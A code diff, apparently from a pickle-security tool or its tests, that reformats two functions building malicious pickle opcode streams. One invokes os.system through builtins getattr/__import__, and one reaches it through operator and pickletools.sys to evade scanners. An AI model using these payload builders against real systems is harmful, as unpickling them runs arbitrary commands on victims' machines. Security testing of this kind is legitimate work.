@@ -48,9 +48,15 @@ def _build_rce_chain(cmd):
         _PROTO
         + _pglob("builtins", "getattr")
         + _pglob("builtins", "__import__")
-        + _pstr("os") + _T1 + _REDUCE
-        + _pstr("system") + _T2 + _REDUCE
-        + _pstr(cmd) + _T1 + _REDUCE
+        + _pstr("os")
+        + _T1
+        + _REDUCE
+        + _pstr("system")
+        + _T2
+        + _REDUCE
+        + _pstr(cmd)
+        + _T1
+        + _REDUCE
         + _STOP
     )
 
@@ -59,14 +65,28 @@ def _build_operator_bypass_chain(cmd):
     """operator.attrgetter/itemgetter + pickletools.sys chain."""
     return (
         _PROTO
-        + _pglob("operator", "attrgetter") + _pstr("system") + _T1 + _REDUCE
-        + _pglob("operator", "itemgetter") + _pstr("os") + _T1 + _REDUCE
-        + _pglob("operator", "attrgetter") + _pstr("modules") + _T1 + _REDUCE
+        + _pglob("operator", "attrgetter")
+        + _pstr("system")
+        + _T1
+        + _REDUCE
+        + _pglob("operator", "itemgetter")
+        + _pstr("os")
+        + _T1
+        + _REDUCE
+        + _pglob("operator", "attrgetter")
+        + _pstr("modules")
+        + _T1
+        + _REDUCE
         + _pglob("pickletools", "sys")
-        + _T1 + _REDUCE
-        + _T1 + _REDUCE
-        + _T1 + _REDUCE
-        + _pstr(cmd) + _T1 + _REDUCE
+        + _T1
+        + _REDUCE
+        + _T1
+        + _REDUCE
+        + _T1
+        + _REDUCE
+        + _pstr(cmd)
+        + _T1
+        + _REDUCE
         + _STOP
     )
 
